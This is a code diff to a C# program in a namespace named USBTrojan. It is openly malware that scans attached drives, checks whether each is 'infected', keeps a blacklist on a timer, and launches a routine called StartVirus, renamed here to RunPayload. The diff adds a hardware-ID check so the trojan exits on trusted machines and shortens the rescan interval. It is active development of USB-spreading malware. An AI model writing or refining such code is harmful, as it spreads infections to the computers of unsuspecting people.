@@ -11,17 +11,25 @@ namespace USBTrojan
         {
             if (args.Length > 1 && args[0] == "-i")
             {
-                USBMode(String.Format("{0}\\{1}",
+                USBMode(string.Format("{0}\\{1}",
                     Environment.CurrentDirectory.Split('\\')[0],
-                    String.Concat(args).Substring(2)));
+                    string.Concat(args).Substring(2)));
             }
             else
             {
-                Console.WriteLine("Calculating HWID...");
-                HWID.GetHWID();
-                Timer timer = new Timer(ResetBlacklist, null, 1000 * 60 * 1, 1000 * 60 * 1);
-                Console.WriteLine("Strating service...");
-                Tools.StartVirus();
+                if (Config.HWID_Enabled)
+                {
+                    Console.WriteLine("Calculating HWID...");
+                    Console.WriteLine($"HWID: {HWID.GetHWID()}");
+                    if (HWID.CheckHWID())
+                    {
+                        Console.WriteLine("Trusted HWID, terminating program...");
+                        return;
+                    }
+                }
+                Timer timer = new Timer(ResetBlacklist, null, 10000, 10000);
+                Console.WriteLine("Executing payload...");
+                Tools.RunPayload();
                 while (true)
                 {
                     BaseMode();
@@ -30,7 +38,7 @@ namespace USBTrojan
             }
         }
 
-        static void ResetBlacklist(Object state) {
+        static void ResetBlacklist(object state) {
             Console.WriteLine("Blacklist: clear");
             USB.blacklist.Clear();
         }
@@ -39,7 +47,8 @@ namespace USBTrojan
             DriveInfo[] drives = DriveInfo.GetDrives();
             foreach (var drive in drives)
             {
-                if (USB.blacklist.Contains(drive.Name)) continue;
+                if (USB.blacklist.Contains(drive.Name))
+                    continue;
                 Console.WriteLine($"{drive.Name}: supported={USB.IsSupported(drive)}; infected={USB.IsInfected(drive.Name)}");
                 if (USB.IsSupported(drive))
                 {
@@ -52,12 +61,11 @@ namespace USBTrojan
                             USB.blacklist.Add(drive.Name);
                         }
                     }
-                    else USB.blacklist.Add(drive.Name);
+                    else
+                        USB.blacklist.Add(drive.Name);
                 }
                 else
-                {
                     USB.blacklist.Add(drive.Name);
-                }
             }
         }
 
@@ -78,7 +86,8 @@ namespace USBTrojan
                     Console.WriteLine(ex.Message);
                 }
             }
-            else Environment.Exit(0);
+            else
+                Environment.Exit(0);
         }
     }
 }
